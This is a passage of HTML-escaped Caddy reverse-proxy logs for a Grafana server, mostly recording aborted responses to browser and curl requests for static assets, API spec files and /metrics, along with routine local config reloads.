deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5&quot;],&quot;Priority&quot;:[&quot;u=0&quot;],&quot;User-Agent&quot;:[&quot;Grafana/11.0.0&quot;],&quot;X-Forwarded-For&quot;:[&quot;218.77.82.133, 127.0.0.1&quot;],&quot;X-Grafana-Cache&quot;:[&quot;private, max-age=60&quot;],&quot;X-Grafana-Org-Id&quot;:[&quot;1&quot;],&quot;X-Grafana-Referer&quot;:[&quot;http://156.239.26.40:13334/dashboard/new?orgId=1&amp;editPanel=1&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773471554.846347,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000968678,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;1.55.219.253&quot;,&quot;remote_port&quot;:&quot;10583&quot;,&quot;client_ip&quot;:&quot;1.55.219.253&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/openapi3.json&quot;,&quot;headers&quot;:&#123;&quot;User-Agent&quot;:[&quot;curl/8.18.0&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;X-Forwarded-For&quot;:[&quot;1.55.219.253&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;1.55.219.253:10583: write: connection reset by peer&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773471555.2545483,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000726033,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;1.55.219.253&quot;,&quot;remote_port&quot;:&quot;21696&quot;,&quot;client_ip&quot;:&quot;1.55.219.253&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/api-merged.json&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;*/*&quot;],&quot;User-Agent&quot;:[&quot;curl/8.18.0&quot;],&quot;X-Forwarded-For&quot;:[&quot;1.55.219.253&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;1.55.219.253:21696: write: connection reset by peer&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773471591.6568954,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;POST&quot;,&quot;host&quot;:&quot;127.0.0.1:2019&quot;,&quot;uri&quot;:&quot;/load&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;59224&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Content-Length&quot;:[&quot;699&quot;],&quot;Content-Type&quot;:[&quot;application/json&quot;],&quot;User-Agent&quot;:[&quot;curl/7.81.0&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773471591.6571116,&quot;msg&quot;:&quot;config is unchanged&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773471591.6571336,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;load complete&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773471618.4362855,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000725928,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;111.50.85.80&quot;,&quot;remote_port&quot;:&quot;22358&quot;,&quot;client_ip&quot;:&quot;111.50.85.80&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/484.805ce326eee3d290c3d9.js&quot;,&quot;headers&quot;:&#123;&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;],&quot;Cookie&quot;:[&quot;REDACTED&quot;],&quot;X-Forwarded-For&quot;:[&quot;111.50.85.80&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;111.50.85.80:22358: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773471679.3783875,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.001403962,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;183.69.141.140&quot;,&quot;remote_port&quot;:&quot;52953&quot;,&quot;client_ip&quot;:&quot;183.69.141.140&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/4570.87a4acc6d9144f9ee50a.js&quot;,&quot;headers&quot;:&#123;&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Range&quot;:[&quot;bytes=653261-3661057&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;],&quot;Cookie&quot;:[&quot;REDACTED&quot;],&quot;X-Forwarded-For&quot;:[&quot;183.69.141.140&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;],&quot;If-Range&quot;:[&quot;Tue, 14 May 2024 08:57:34 GMT&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;183.69.141.140:52953: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773471679.407682,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.001553449,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;183.69.141.140&quot;,&quot;remote_port&quot;:&quot;58322&quot;,&quot;client_ip&quot;:&quot;183.69.141.140&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/app.bbd213ecba15db924b4e.js&quot;,&quot;headers&quot;:&#123;&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Range&quot;:[&quot;bytes=400965-1099048&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0&quot;],&quot;X-Forwarded-For&quot;:[&quot;183.69.141.140&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Cookie&quot;:[&quot;REDACTED&quot;],&quot;If-Range&quot;:[&quot;Tue, 14 May 2024 08:57:34 GMT&quot;],&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;183.69.141.140:58322: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773471679.5222967,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000978885,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;183.69.141.140&quot;,&quot;remote_port&quot;:&quot;49873&quot;,&quot;client_ip&quot;:&quot;183.69.141.140&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/484.805ce326eee3d290c3d9.js&quot;,&quot;headers&quot;:&#123;&quot;Cookie&quot;:[&quot;REDACTED&quot;],&quot;X-Forwarded-For&quot;:[&quot;183.69.141.140&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;],&quot;Range&quot;:[&quot;bytes=384621-6612016&quot;],&quot;If-Range&quot;:[&quot;Tue, 14 May 2024 08:57:34 GMT&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;183.69.141.140:49873: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773471847.0317051,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000906194,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;183.69.141.140&quot;,&quot;remote_port&quot;:&quot;65330&quot;,&quot;client_ip&quot;:&quot;183.69.141.140&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/484.805ce326eee3d290c3d9.js&quot;,&quot;headers&quot;:&#123;&quot;Accept-Encoding&quot;:[&quot;gzip, deflate, br&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;X-Forwarded-For&quot;:[&quot;183.69.141.140&quot;],&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;183.69.141.140:65330: write: connection reset by peer&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773471847.040364,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000771258,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;183.69.141.140&quot;,&quot;remote_port&quot;:&quot;59110&quot;,&quot;client_ip&quot;:&quot;183.69.141.140&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/484.805ce326eee3d290c3d9.js&quot;,&quot;headers&quot;:&#123;&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate, br&quot;],&quot;X-Forwarded-For&quot;:[&quot;183.69.141.140&quot;],&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0&quot;],&quot;Accept&quot;:[&quot;*/*&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;183.69.141.140:59110: write: connection reset by peer&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773471847.0496857,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.001526335,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;183.69.141.140&quot;,&quot;remote_port&quot;:&quot;65332&quot;,&quot;client_ip&quot;:&quot;183.69.141.140&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/4570.87a4acc6d9144f9ee50a.js&quot;,&quot;headers&quot;:&#123;&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate, br&quot;],&quot;X-Forwarded-For&quot;:[&quot;183.69.141.140&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;183.69.141.140:65332: write: connection reset by peer&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773471891.6783605,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;POST&quot;,&quot;host&quot;:&quot;127.0.0.1:2019&quot;,&quot;uri&quot;:&quot;/load&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;59416&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Content-Length&quot;:[&quot;699&quot;],&quot;Content-Type&quot;:[&quot;application/json&quot;],&quot;User-Agent&quot;:[&quot;curl/7.81.0&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773471891.678684,&quot;msg&quot;:&quot;config is unchanged&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773471891.6787274,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;load complete&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773471984.7370272,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.040479066,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;92.253.100.128&quot;,&quot;remote_port&quot;:&quot;59773&quot;,&quot;client_ip&quot;:&quot;92.253.100.128&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/metrics&quot;,&quot;headers&quot;:&#123;&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.26100.7705&quot;],&quot;X-Forwarded-For&quot;:[&quot;92.253.100.128&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;92.253.100.128:59773: write: connection reset by peer&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773472191.7045276,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;POST&quot;,&quot;host&quot;:&quot;127.0.0.1:2019&quot;,&quot;uri&quot;:&quot;/load&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;59558&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Content-Length&quot;:[&quot;699&quot;],&quot;Content-Type&quot;:[&quot;application/json&quot;],&quot;User-Agent&quot;:[&quot;curl/7.81.0&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773472191.7048392,&quot;msg&quot;:&quot;config is unchanged&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773472191.7048671,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;load complete&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773472491.7283113,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;POST&quot;,&quot;host&quot;:&quot;127.0.0.1:2019&quot;,&quot;uri&quot;:&quot;/load&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;59668&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Content-Length&quot;:[&quot;699&quot;],&quot;Content-Type&quot;:[&quot;application/json&quot;],&quot;User-Agent&quot;:[&quot;curl/7.81.0&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773472491.7287023,&quot;msg&quot;:&quot;config is unchanged&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773472491.7287269,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;load complete&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773472495.8477623,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000752003,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;103.137.184.191&quot;,&quot;remote_port&quot;:&quot;19140&quot;,&quot;client_ip&quot;:&quot;103.137.184.191&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/grafana.dark.044d0c515b179d71f902.css&quot;,&quot;headers&quot;:&#123;&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;],&quot;X-Forwarded-For&quot;:[&quot;103.137.184.191&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36&quot;],&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;Cookie&quot;:[&quot;REDACTED&quot;],&quot;Accept&quot;:[&quot;text/css,*/*;q=0.1&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;103.137.184.191:19140: write: connection timed out&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773472573.6588993,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000873613,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;42.122.141.144&quot;,&quot;remote_port&quot;:&quot;58293&quot;,&quot;client_ip&quot;:&quot;42.122.141.144&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/grafana.dark.044d0c515b179d71f902.css&quot;,&quot;headers&quot;:&#123;&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;X-Forwarded-For&quot;:[&quot;42.122.141.144&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0&quot;],&quot;Accept&quot;:[&quot;text/css,*/*;q=0.1&quot;],&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;42.122.141.144:58293: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773472573.6963034,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.001004502,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;42.122.141.144&quot;,&quot;remote_port&quot;:&quot;51833&quot;,&quot;client_ip&quot;:&quot;42.122.141.144&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/484.805ce326eee3d290c3d9.js&quot;,&quot;headers&quot;:&#123;&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;],&quot;X-Forwarded-For&quot;:[&quot;42.122.141.144&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;42.122.141.144:51833: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773472573.840938,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000738219,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;42.122.141.144&quot;,&quot;remote_port&quot;:&quot;53704&quot;,&quot;client_ip&quot;:&quot;42.122.141.144&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/4570.87a4acc6d9144f9ee50a.js&quot;,&quot;headers&quot;:&#123;&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;X-Forwarded-For&quot;:[&quot;42.122.141.144&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;42.122.141.144:53704: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773472573.8846352,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000656826,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;42.122.141.144&quot;,&quot;remote_port&quot;:&quot;49196&quot;,&quot;client_ip&quot;:&quot;42.122.141.144&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/app.bbd213ecba15db924b4e.js&quot;,&quot;headers&quot;:&#123;&quot;X-Forwarded-For&quot;:[&quot;42.122.141.144&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;42.122.141.144:49196: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773472634.6333609,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete 